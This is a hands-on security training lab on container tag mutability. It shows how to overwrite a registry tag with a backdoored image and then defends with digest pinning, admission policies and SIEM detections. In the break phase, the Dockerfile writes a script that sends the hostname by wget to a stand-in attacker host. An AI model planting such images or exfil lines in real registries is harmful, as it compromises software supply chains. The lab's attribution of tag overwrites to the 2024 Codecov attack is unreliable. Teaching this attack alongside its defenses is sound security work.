# Lab 3.2: Tag Mutability Attacks

<div class="lab-meta">
  <span>~30 minutes</span>
  <span>Intermediate</span>
  <span>Prerequisites: <a href="../tier-0/0.3-containers.md">Lab 0.3</a></span>
</div>

Container image tags are mutable pointers. When your Kubernetes deployment says `image: webapp:1.0.0`, there is no guarantee that `1.0.0` today points to the same image as `1.0.0` yesterday. An attacker (or a compromised CI pipeline) can overwrite a tag with a completely different image. The next time a pod restarts, it pulls the attacker's version.

This is not a theoretical risk. In 2024, the Codecov supply chain attack and multiple container-based compromises exploited exactly this: push a backdoored image over an existing tag, wait for automated deployments to pick it up.

In this lab, you will overwrite a tag with a backdoored image and see a deployment pull it, then defend by pinning to digests.

!!! info "Phase 1: UNDERSTAND -- Tags Are Mutable Pointers"

    **Goal:** See that a tag is just a pointer to a digest, and that the same tag can point to different images at different times.

### Step 1: Inspect the current tag

```bash
crane digest registry:5000/webapp:1.0.0
```

This returns the content-addressable SHA256 digest. Save it:

```bash
crane digest registry:5000/webapp:1.0.0 > /app/safe-digest.txt
cat /app/safe-digest.txt
```

### Step 2: Verify the running deployment

```bash
kubectl get deployment webapp -o jsonpath='{.spec.template.spec.containers[0].image}'
```

The deployment references `registry:5000/webapp:1.0.0` -- a tag, not a digest.

### Step 3: Test the running app

```bash
kubectl exec deploy/webapp -- cat /app/version.txt
```

It prints the legitimate version. Everything looks correct.

### Step 4: Understand the risk

The deployment uses a tag. If anyone pushes a new image to `registry:5000/webapp:1.0.0`, the next pod restart will pull the new image. Kubernetes does not verify that the image content matches what was originally deployed.

With `imagePullPolicy: Always` (the default for `:latest`, and common in production), every pod restart triggers a fresh pull.

---

!!! warning "Phase 2: BREAK -- Overwriting a Tag With a Backdoored Image"

    **Goal:** Push a backdoored image with the same tag and see the deployment pull it.

### Step 1: Build the backdoored image

```bash
cat > /tmp/Dockerfile.backdoor << 'EOF'
FROM alpine:3.19
RUN echo "BACKDOORED" > /app/version.txt && \
    echo '#!/bin/sh' > /usr/local/bin/backdoor.sh && \
    echo 'wget -q http://attacker.example.com/exfil?host=$(hostname)' >> /usr/local/bin/backdoor.sh && \
    chmod +x /usr/local/bin/backdoor.sh
CMD ["cat", "/app/version.txt"]
EOF

docker build -t registry:5000/webapp:1.0.0 -f /tmp/Dockerfile.backdoor /tmp/
```

### Step 2: Push with the same tag

```bash
docker push registry:5000/webapp:1.0.0
```

The tag `1.0.0` now points to a completely different image. No warning, no confirmation.

### Step 3: Verify the digest changed

```bash
crane digest registry:5000/webapp:1.0.0
```

Compare this to the digest you saved earlier. It is different -- same tag, different image.

### Step 4: Trigger a redeploy

```bash
kubectl rollout restart deployment/webapp
kubectl rollout status deployment/webapp --timeout=60s
```

### Step 5: Check the damage

```bash
kubectl exec deploy/webapp -- cat /app/version.txt
```

It now prints "BACKDOORED". The deployment pulled the attacker's image because the tag was overwritten. No alerts, no errors -- just a silent replacement.

### Step 6: Record your findings

```bash
cat > /app/findings.txt << EOF
Original safe digest: $(cat /app/safe-digest.txt)
Current (backdoored) digest: $(crane digest registry:5000/webapp:1.0.0)
The tag 1.0.0 was overwritten with a backdoored image.
Kubernetes pulled the new image on rollout restart without any verification.
EOF
```

!!! success "Phase 3: DEFEND -- Digest Pinning and Admission Control"

    **Goal:** Pin images by digest and deploy an admission controller to reject tag-only references.

### Defense 1: Restore the safe image

```bash
# Tag the safe image back (you need the original safe digest)
SAFE_DIGEST=$(cat /app/safe-digest.txt)
crane tag registry:5000/webapp@${SAFE_DIGEST} 1.0.0
```

### Defense 2: Pin by digest in the deployment

```bash
SAFE_DIGEST=$(cat /app/safe-digest.txt)

cat > /app/deploy/deployment.yml << EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webapp
spec:
  replicas: 1
  selector:
    matchLabels:
      app: webapp
  template:
    metadata:
      labels:
        app: webapp
    spec:
      containers:
        - name: webapp
          image: registry:5000/webapp@${SAFE_DIGEST}
          imagePullPolicy: Always
EOF

kubectl apply -f /app/deploy/deployment.yml
kubectl rollout status deployment/webapp --timeout=60s
```

Now even if the tag is overwritten, the deployment will always pull the exact image matching this digest.

### Defense 3: Verify the safe image is back

```bash
kubectl exec deploy/webapp -- cat /app/version.txt
```

### Defense 4: Admission controller (discussion)

A Kyverno policy can reject any pod that uses a tag-only image reference:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-digest
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-digest
      match:
        any:
          - resources:
              kinds: ["Pod"]
      validate:
        message: "Images must use digest references (@sha256:), not tags"
        pattern:
          spec:
            containers:
              - image: "*@sha256:*"
```

This ensures that no deployment in the cluster can use a mutable tag reference.

!!! danger "Phase 4: DETECT -- Finding Tag Overwrites in Production"

    **Goal:** Detect when a tag is overwritten in your registry and when deployments pull unexpected image content.

### SIEM / Log Indicators

The core signal is **a tag push to a registry where the tag already existed with a different digest**. This is the moment the attack happens. The secondary signal is **a deployment pulling a different digest than it previously ran**.

**What to look for:**

- Registry audit logs showing a `PUT` to a tag that already existed (tag overwrite)
- Deployment events where the pulled image digest differs from the previously running digest
- Pod restarts that coincide with registry push events
- `imagePullPolicy: Always` on production deployments (increases exposure window)

### Network Indicators

| Indicator | What It Means |
|-----------|---------------|
| Registry `PUT /v2/<repo>/manifests/<tag>` for existing tag | Tag is being overwritten -- potential attack |
| Kubelet pulling different digest for same tag | The tag now points to a different image |
| Spike in registry pull requests after a push event | Automated deployments are pulling the new (potentially malicious) image |

**Suricata rule -- detect registry tag overwrite:**

```yaml
alert http any any -> $REGISTRY_SERVERS any (
  msg:"WEAKLINK - Container registry tag overwrite detected";
  flow:established,to_server;
  http.method; content:"PUT";
  http.uri; content:"/v2/"; content:"/manifests/";
  classtype:policy-violation;
  sid:2100010; rev:1;
)
```

### Example Detection Queries

**Splunk -- detect tag overwrites in registry audit log:**

```spl
index=container_registry sourcetype=registry_audit
  action="push" tag!="latest"
| dedup repository, tag sortby -_time
| stats count by repository, tag
| where count > 1
| rename repository AS repo
| table repo, tag, count
```

**Splunk -- detect digest mismatch between runs:**

```spl
index=kubernetes sourcetype=kube:events
  reason="Pulled"
| rex field=message "Successfully pulled image \"(?<image>[^\"]+)\""
| rex field=image "@sha256:(?<digest>[a-f0-9]+)"
| stats dc(digest) AS unique_digests, values(digest) AS digests by image
| where unique_digests > 1
| table image, unique_digests, digests
```

**KQL -- detect tag overwrite via registry API:**

```kql
ContainerRegistryRepositoryEvents
| where OperationName == "Push"
| where MediaType has "manifest"
| summarize PushCount=count(), Digests=make_set(Digest) by Repository, Tag, bin(TimeGenerated, 1h)
| where PushCount > 1
| project TimeGenerated, Repository, Tag, PushCount, Digests
```

**KQL -- detect Kubernetes pulling different digest for same image tag:**

```kql
KubeEvents
| where Reason == "Pulled"
| extend ImageRef = extract(@"\"(.+?)\"", 1, Message)
| extend Digest = extract(@"sha256:([a-f0-9]+)", 1, ImageRef)
| summarize UniqueDigests=dcount(Digest), DigestList=make_set(Digest) by ImageRef, bin(TimeGenerated, 1h)
| where UniqueDigests > 1
```

!!! tip "SOC Relevance"

    **Alerts you will see:**

    - "Registry tag overwrite: webapp:1.0.0 pushed with new digest"
    - "Kubernetes deployment pulled different digest for same image tag"

    **Why this matters:** Tag overwrites are silent. There is no built-in alert in Docker registries or Kubernetes when a tag is moved to a different image. Without monitoring, an attacker can replace any image in your registry and it will be automatically deployed on the next pod restart.

    **Triage steps:**

    1. Compare the new digest against the previous digest for the same tag
    2. Check who pushed the new image (registry audit log -- user, IP, timestamp)
    3. Inspect the new image layers -- does it contain unexpected binaries or scripts?
    4. If unauthorized: immediately re-tag the known-good digest and redeploy
    5. Rotate any secrets that were accessible to pods running the compromised image

    **Prevention:** Enable tag immutability in your registry (ECR, GCR, and Harbor all support this). Once a tag is pushed, it cannot be overwritten.

!!! example "CI Integration"

    Add this to your CI pipeline to ensure deployments always use digest references.

    **`.github/workflows/digest-check.yml`:**

    ```yaml
    name: Image Digest Enforcement

    on:
      pull_request:
        paths:
          - "k8s/**"
          - "deploy/**"
          - "helm/**"

    jobs:
      check-digests:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4

          - name: Reject tag-only image references
            run: |
              echo "--- Scanning for tag-only image references ---"
              FOUND=0
              for f in $(find k8s/ deploy/ helm/ -name '*.yml' -o -name '*.yaml' 2>/dev/null); do
                while IFS= read -r line; do
                  # Match image: lines that use tags but not digests
                  if echo "$line" | grep -qE 'image:.*:[a-zA-Z0-9._-]+$' && \
                     ! echo "$line" | grep -q '@sha256:'; then
                    echo "::error file=$f::Tag-only image reference found: $line"
                    echo "  Use a digest reference instead: image: <registry>/<repo>@sha256:<digest>"
                    FOUND=1
                  fi
                done < "$f"
              done
              if [ "$FOUND" -eq 1 ]; then
                echo ""
                echo "Tags are mutable. An attacker can overwrite a tag with a"
                echo "backdoored image. Always use digest references (@sha256:)."
                exit 1
              fi
              echo "PASS: All image references use digests."

          - name: Verify imagePullPolicy
            run: |
              echo "--- Checking imagePullPolicy settings ---"
              for f in $(find k8s/ deploy/ helm/ -name '*.yml' -o -name '*.yaml' 2>/dev/null); do
                if grep -q "imagePullPolicy: Always" "$f" && ! grep -q '@sha256:' "$f"; then
                  echo "::warning file=$f::imagePullPolicy: Always with tag reference -- high risk of pulling overwritten image"
                fi
              done
    ```

## What You Learned

1. **Tags are mutable** -- `webapp:1.0.0` today can point to a completely different image tomorrow. Only digests (`@sha256:...`) are immutable.
2. **Tag overwrites are silent** -- registries do not alert when a tag is moved to a new digest. Kubernetes does not verify that the image content is what you expect.
3. **`imagePullPolicy: Always` amplifies the risk** -- every pod restart pulls the latest image for the tag, which may have been overwritten.
4. **Digest pinning is the fix** -- referencing images by `@sha256:` ensures you always get exactly the image you intended.
5. **Admission controllers enforce the policy** -- Kyverno or OPA Gatekeeper can reject any pod spec that uses a tag without a digest.
